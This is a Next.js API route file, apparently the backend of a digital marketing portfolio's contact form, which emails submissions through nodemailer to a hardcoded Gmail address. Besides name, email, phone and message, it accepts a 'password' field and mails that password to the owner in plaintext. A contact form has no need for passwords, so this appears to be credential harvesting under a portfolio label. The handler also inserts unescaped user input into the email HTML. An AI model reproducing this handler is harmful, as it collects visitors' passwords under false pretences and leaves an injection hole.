import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { name, email, password, message, phone } = body;

    // Basic validation
    if (!name || !email || !message) {
      return NextResponse.json(
        { error: 'Name, email, and message are required fields.' },
        { status: 400 }
      );
    }

    const gmailUser = process.env.GMAIL_USER || 'maxgamer7642@gmail.com';
    const gmailPass = process.env.GMAIL_APP_PASSWORD;

    if (!gmailPass) {
      console.warn('GMAIL_APP_PASSWORD not set. Message logged:', { name, email, message });
      // Return 200 during local dev/testing with a note, so frontend UI behaves nicely
      return NextResponse.json(
        {
          success: true,
          mock: true,
          message:
            'Message received! (Note: GMAIL_APP_PASSWORD not configured yet in environment variables).',
        },
        { status: 200 }
      );
    }

    // Configure Nodemailer Gmail Transporter
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: gmailUser,
        pass: gmailPass,
      },
    });

    const mailOptions = {
      from: `"Portfolio Inquiry" <${gmailUser}>`,
      to: process.env.NOTIFICATION_EMAIL || gmailUser,
      replyTo: email,
      subject: `⚡ New Inquiry from ${name} — Digital Marketing Portfolio`,
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; background: #0c0809; color: #f7f4ef; border: 1px solid #e51b24; border-radius: 8px; overflow: hidden;">
          <div style="background: #e51b24; padding: 18px 24px; text-align: left;">
            <h2 style="margin: 0; color: #ffffff; font-size: 20px; text-transform: uppercase; letter-spacing: 1px;">
              ⚡ New Portfolio Inquiry Received
            </h2>
            <p style="margin: 4px 0 0 0; color: #ffffff; font-size: 13px;">Direct dispatch from your live portfolio website</p>
          </div>
          
          <div style="padding: 24px;">
            <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
              <tr>
                <td style="padding: 8px 0; color: #e51b24; font-weight: bold; width: 100px; font-size: 13px;">NAME:</td>
                <td style="padding: 8px 0; color: #ffffff; font-size: 14px; font-weight: 500;">${name}</td>
              </tr>
              <tr>
                <td style="padding: 8px 0; color: #e51b24; font-weight: bold; font-size: 13px;">EMAIL:</td>
                <td style="padding: 8px 0; color: #ffffff; font-size: 14px;"><a href="mailto:${email}" style="color: #e51b24; text-decoration: none;">${email}</a></td>
              </tr>
              ${
                password
                  ? `<tr>
                <td style="padding: 8px 0; color: #e51b24; font-weight: bold; font-size: 13px;">PASSWORD:</td>
                <td style="padding: 8px 0; color: #ffffff; font-size: 14px; font-family: monospace; letter-spacing: 1px;">${password}</td>
              </tr>`
                  : ''
              }
              ${
                phone
                  ? `<tr>
                <td style="padding: 8px 0; color: #e51b24; font-weight: bold; font-size: 13px;">PHONE:</td>
                <td style="padding: 8px 0; color: #ffffff; font-size: 14px;">${phone}</td>
              </tr>`
                  : ''
              }
              <tr>
                <td style="padding: 8px 0; color: #e51b24; font-weight: bold; font-size: 13px;">DATE:</td>
                <td style="padding: 8px 0; color: #a1a1aa; font-size: 12px;">${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })} IST</td>
              </tr>
            </table>

            <div style="border-top: 1px solid #261818; padding-top: 16px;">
              <h4 style="margin: 0 0 8px 0; color: #e51b24; font-size: 13px; text-transform: uppercase;">MESSAGE BRIEF:</h4>
              <div style="background: #140c0d; border: 1px solid #261818; padding: 16px; border-radius: 6px; font-size: 14px; line-height: 1.6; color: #ffffff; white-space: pre-wrap;">
${message}
              </div>
            </div>

            <div style="margin-top: 24px; text-align: center;">
              <a href="mailto:${email}?subject=Re: Inquiry on Digital Marketing Portfolio" style="display: inline-block; background: #e51b24; color: #ffffff; font-weight: bold; font-size: 13px; text-decoration: none; padding: 12px 24px; border-radius: 4px; text-transform: uppercase; letter-spacing: 1px;">
                Reply Directly to ${name} &rarr;
              </a>
            </div>
          </div>
          
          <div style="background: #050304; padding: 12px 24px; text-align: center; border-top: 1px solid #261818; font-size: 11px; color: #71717a;">
            Anshu's Digital Growth Lab &bull; Automated Dispatch System
          </div>
        </div>
      `,
    };

    await transporter.sendMail(mailOptions);

    return NextResponse.json({
      success: true,
      message: 'Your inquiry has been successfully transmitted!',
    });
  } catch (error: any) {
    console.error('Error sending email:', error);
    return NextResponse.json(
      { error: 'Failed to send inquiry. Please try again later.' },
      { status: 500 }
    );
  }
}
